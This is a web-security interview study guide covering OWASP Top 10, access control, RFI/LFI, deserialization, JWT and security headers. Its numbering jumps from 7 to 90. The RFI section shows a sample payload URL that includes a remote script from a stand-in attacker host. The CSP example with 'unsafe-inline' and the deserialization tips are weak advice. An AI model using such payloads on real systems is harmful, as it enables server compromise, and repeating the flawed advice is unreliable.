# web-security
# Web Security Interview Questions

## 1. What is web security?

Web security involves using strategies and technologies aimed at protecting internet-connected systems, including web applications and services, from various malicious threats, as it's essential for businesses to prioritize safeguarding data and upholding user trust.

### Fundamental Security Principles

- **Confidentiality :** Ensuring that sensitive information is accessible only to authorized entities.
- **Integrity :**  Preserving the accuracy and trustworthiness of data.
- **Availability :** Making resources and services accessible when needed.


## 2. What are the common types of web attacks?

The common types of web attacks are as follows:

1. SQL Injection
2. Cross-Site Scripting (XSS)
3. Denial of Service (DoS)
4. Phishing
5. Brute Force


## 3. What is OWASP?

The Open Web Application Security Project, or OWASP, is an international non-profit organization whose sole purpose is to improve software security.OWASP provided knowledge about the tactics that hackers use and how to fight them.

## 4. What is the OWASP Top 10? and why is it important for web application security?

OWASP Top 10 provides information about the 10 most critical security risks for applications at the time of the study. These risks represent common vulnerabilities and weaknesses that are frequently exploited by attackers and cause the most damage.

The OWASP Top 10 is crucial for web app security because it identifies common vulnerabilities, guides proactive measures, and helps prioritize efforts to protect applications from cyber threats.It’s important to note that the items featured in the list are not vulnerabilities, but categories


- The first version of the OWASP Top 10 List was released in 2003.

- Subsequent updates were made in 2004, 2007, 2010, 2013, 2017, and most recently in 2021. We are currently using the 2021 version.

### **The OWASP Top 10 (2021) Categories are**

    1.  Broken Access Control
    2.  Cryptographic Failures
    3.  Injection
    4.  Insecure Design
    5.  Security Misconfiguration
    6.  Vulnerable and Outdated Components
    7.  Identification and Authentication Failures
    8.  Software and Data Integrity Failures
    9.  Security Logging and Monitoring Failures
    10. Server-Side Request Forgery
   
### Now, I will explain each OWASP Top 10 category one by one. Let's start with Broken Access Control.

## 5. Explain Broken Access Control (First on the OWASP list)

Broken Access Control is a security vulnerability that occurs when a web application fails to properly enforce restrictions on what authenticated users are allowed to access. This vulnerability allows attackers to access unauthorized functionality or data, such as sensitive files, administrative features, or other users' accounts.

**Example** : Suppose In a banking application, users can access their account details via URLs like `http://example.com/account?id=123`. . However, the application fails to enforce access controls, allowing any logged-in user to view other users' accounts by simply changing the ID parameter in the URL like `http://example.com/account?id=456`.

In this scenario, the application lacks proper access control mechanisms to ensure that users can only access their own account information. This vulnerability could lead to unauthorized access to sensitive financial data and potentially compromise the privacy and security of the affected users.

### 6. What are the Impact of Broken Access Controls?

When access controls fail, organizations face risks such as data breaches, which can lead to identity theft and financial loss. Compliance violations are another concern, potentially resulting in fines for failing to meet regulatory requirements. Additionally, broken access controls can cause operational disruptions, leading to downtime and financial losses.

### 7. How to Prevent Broken Access Control

1.  Secure Session Management and Authentication Controls

2. Secure file systems by disabling directory listings and protecting file metadata.

3. Maintain logs of access control failures and promptly notify administrators.

4. Implement rate limiting across all system components to prevent automated attack attempts.
## **Remote File Inclusion (RFI)**

Remote File Inclusion (RFI) is a vulnerability present in web applications that allows attackers to include external files on a server. Unlike Local File Inclusion (LFI), where the attacker includes files already present on the server, RFI involves including files from remote locations, typically controlled by the attacker.

In RFI attacks, web applications dynamically include files using user-supplied input, such as URLs. If the application fails to properly validate and sanitize this input, an attacker can manipulate it to include malicious files hosted on external servers. These files can contain arbitrary code, enabling the attacker to execute commands or perform actions on the server.

**Example** :  Consider a website that includes external files based on a "page" parameter in the URL, like so: 

```
http://example.com/index.php?page=about.php
```
If the website doesn't properly validate or sanitize user input, an attacker could manipulate the "page" parameter to include a malicious file hosted on their own server, such as:

```
http://example.com/index.php?page=http://attacker.com/malicious.php
```

### 90. What Is the Difference Between LFI and RFI?

LFI involves including files already present on the target server, while RFI involves including files from remote servers controlled by the attacker. Both vulnerabilities can have severe security implications if not properly mitigated.

## 91. What is Privilege? Type of Escalation.

Privilege escalation typically involves gaining higher-level permissions within a system or application.

### There are several types of privilege escalation:

1. **Horizontal Privilege Escalation:** Involves gaining access to another user's account or privileges at the same level, typically within a multi-user environment.

2. **Vertical Privilege Escalation:** Involves gaining higher levels of access or permissions, such as escalating from a regular user to an administrator

## 92. Different between IDOR(insecure direct object resources) and Privilege Escalation

Privilege escalation involves obtaining higher-level permissions within a system or application, while Insecure Direct Object Reference (IDOR) involves manipulating object references in an application to access unauthorized data.

## 93. What is insecure deserialization?

Insecure deserialization refers to a security vulnerability that arises when an application does not properly validate or sanitize the data during the deserialization process. Serialization is the process of converting an object or data structure into a format that can be easily stored or transmitted, and deserialization is the reverse process of reconstructing the object from its serialized form.

### 94. Prevention of insecure deserialization.

- **Use Safe Deserialization Libraries:** Use libraries and frameworks that provide secure deserialization features, such as Java's ObjectInputStream with a security manager or .NET's DataContractSerializer.
- **Limit Deserialization Permissions:** Restrict the classes that can be deserialized and use least privilege principles to minimize the impact of deserialization vulnerabilities.

- **Input Validation:** Always validate and sanitize input data, especially when deserializing objects. Ensure that only expected data types and formats are accepted.


## 95. What is SSTI

Server-Side Template Injection (SSTI) is when an application allows user input to control the templates that are used for rendering content on the server side. This can happen when user input is directly embedded into templates without proper validation or sanitization, allowing an attacker to inject template code that is executed by the server.

## 96. Explain JWT ( JSON Web Token )

JWT stands for JSON Web Token, a compact and secure way to transmit information between two parties. Commonly used for authentication and authorization in web applications, a JWT consists of three parts: a header, which specifies the token type and hashing algorithm; a payload, which contains claims about the user and additional metadata; and a signature, which is created by encoding the header and payload with a secret key using the specified algorithm. This signature ensures the integrity and authenticity of the token. By sending the JWT with each request, the server can verify the user's identity and permissions without maintaining session state, making JWTs a popular choice for secure information transmission between client and server.

## 97. Explain what is CVE

CVE stands for Common Vulnerabilities and Exposures. It is a system that provides a reference method for publicly known information-security vulnerabilities and exposures. Each CVE entry has a unique identifier and a brief description of the vulnerability. This system helps security professionals and organizations to share, track, and address security flaws in software and hardware consistently. First launched in 1999, CVE is managed and maintained by the National Cybersecurity FFRDC (Federally Funded Research and Development Center), which is operated by the MITRE Corporation. CVEs are widely used to improve cybersecurity by making it easier to communicate and remediate vulnerabilities.

## 98. Explain difference between Threat vs Vulnerability vs Risk

**Threat** : A threat is any potential event or action that can cause harm to an organization’s systems, networks, or data. Threats can be intentional, like cyber-attacks by hackers, or unintentional, like natural disasters or accidental data deletion.

**Example** : Imagine you have a house. A threat is something that could harm your house, like a burglar who might break in and steal your belongings.

**Vulnerability** : A vulnerability is a weakness or flaw in a system, network, or process that can be exploited by a threat. Vulnerabilities can exist in software, hardware, or human procedures and can result from poor design, configuration errors, or lack of updates.

**Example** : Now, let's say your house has a broken lock on the front door. That broken lock is a vulnerability because it's a weakness that the burglar could use to get inside easily.

**Risk** : Risk is like the chance of something bad happening when a weakness is exposed. It's a mix of how likely that bad thing is to occur and how much damage it could do. Organizations look at risks to figure out how to protect themselves from threats exploiting vulnerabilities.

**Example** : The risk is the chance that the burglar will actually break in because of that broken lock. If the neighborhood has a lot of burglaries and your house has a broken lock, the risk of a break-in is high. But if you fix the lock and add security measures, like an alarm system, you reduce the risk.

Summary:

**Threat** : Something bad that could happen (e.g., burglar).
Vulnerability: A weakness that can be exploited (e.g., broken lock).
Risk: The chance of the bad thing happening and causing harm.


## 99. What are security headers and how do they enhance the security of web applications?

Security headers are HTTP response headers that provide instructions to web browsers on how to behave when interacting with a website. These headers are used to enhance the security of web applications by helping to prevent various types of attacks and vulnerabilities. Some common security headers include:

1. **Content Security Policy (CSP)** : Defines trusted sources for content, instructing the browser on which origins are safe to load resources from. By restricting the origins from which resources like scripts can be executed, CSP mitigates the risk of cross-site scripting (XSS) attacks, enhancing the security of web applications.

    - **Example** : `Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline';`

2. **Strict-Transport-Security (HSTS)** : Instructs browsers to only access the website over HTTPS, even if the user types "http://" in the address bar. This reduces the risk of man-in-the-middle attacks and protocol downgrade attacks.

    - **Example** : `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`

3. **X-Frame-Options** : Determines whether a web page can be displayed within an iframe. This helps prevent clickjacking attacks by ensuring that the page is not embedded in malicious websites.

    - **Example** : `X-Frame-Options: DENY`

4. **X-XSS-Protection** : Enables a built-in XSS filter in modern web browsers to detect and mitigate certain types of XSS attacks.

    - **Example** : `X-XSS-Protection: 1; mode=block`

5. **Content-Type Options** : Prevents browsers from trying to guess the MIME type of a resource, which can help mitigate MIME sniffing attacks.

    - **Example** : `X-Content-Type-Options: nosniff`



## 100. What is Http Parameter Pollution Attack ?

HTTP Parameter Pollution (HPP) is a type of web attack where an attacker manipulates the parameters of a URL or HTTP request to exploit vulnerabilities in a web application. In this attack, the attacker injects additional parameters or modifies existing ones in the HTTP request sent to the server. This can lead to unexpected behavior in the application, potentially allowing the attacker to bypass security measures, access unauthorized information, or perform actions that they are not supposed to.

For example, consider a web application that uses URL parameters to identify users and their permissions. An attacker may manipulate these parameters to change their own user ID to that of an admin, granting themselves elevated privileges within the application.

HPP attacks can occur in various contexts, including:

1. Query strings in URLs.
2. Form submissions in HTML.
3. Cookies sent with HTTP requests.
4. HTTP headers.

To prevent HTTP Parameter Pollution attacks, developers should:

1. Validate and sanitize user input.
2. Use proper encoding and escaping techniques.
3. Implement strong access controls and authentication mechanisms.
4. Regularly update and patch the web application to fix known vulnerabilities.
